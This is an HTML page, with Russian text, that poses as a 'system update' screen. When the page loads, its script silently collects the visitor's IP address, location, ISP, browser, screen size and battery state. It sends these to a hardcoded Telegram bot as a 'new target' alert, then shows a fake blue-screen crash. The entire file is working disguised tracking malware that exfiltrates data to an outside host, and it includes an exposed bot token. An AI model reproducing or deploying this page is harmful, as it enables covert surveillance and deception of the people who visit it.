<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Обновление системы</title>
  <style>
    body { background: #0a0a0a; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
    .loader { text-align: center; border: 2px solid #00ff41; padding: 40px; border-radius: 15px; background: #111; }
    .spinner { display: inline-block; width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #00ff41; border-radius: 50%; animation: spin 1s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
  </style>
</head>
<body>
  <div class="loader">
    <div class="spinner"></div>
    <h2>Установка обновлений...</h2>
    <p>Пожалуйста, не выключайте устройство</p>
  </div>

  <script>
    async function collectAndSend() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();

        let battery = 'недоступно';
        try {
          if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery = Math.round(b.level * 100) + '% | ' + (b.charging ? 'заряжается' : 'не заряжается');
          }
        } catch(e) {}

        const message = 'НОВЫЙ ЦЕЛЬ!\n' +
          'IP: ' + (data.ip || '—') + '\n' +
          'Город: ' + (data.city || '—') + '\n' +
          'Регион: ' + (data.region || '—') + '\n' +
          'Страна: ' + (data.country_name || '—') + '\n' +
          'Провайдер: ' + (data.org || '—') + '\n' +
          'Часовой пояс: ' + (data.timezone || '—') + '\n' +
          'Браузер: ' + navigator.userAgent + '\n' +
          'Экран: ' + screen.width + 'x' + screen.height + '\n' +
          'Батарея: ' + battery + '\n' +
          'Язык: ' + navigator.language;

        const token = '8846056738:AAECpZGTr0h7NfRSY5RteoD5lCTdkRRLjtU';
        const chatId = '8098905046';
        await fetch('https://api.telegram.org/bot' + token + '/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: chatId, text: message })
        });

        document.body.innerHTML = '<div style="background:#0000aa;color:white;display:flex;height:100vh;justify-content:center;align-items:center;flex-direction:column;font-family:monospace;padding:20px;text-align:center;"><h1 style="font-size:50px;">:(</h1><p style="font-size:24px;">Ваш компьютер столкнулся с проблемой</p><p style="font-size:14px;margin-top:40px;">Код ошибки: CRITICAL_PROCESS_DIED</p></div>';
      } catch(e) {
        document.body.innerHTML = '<h1 style="color:red;">Ошибка</h1>';
      }
    }
    collectAndSend();
  </script>
</body>
</html>
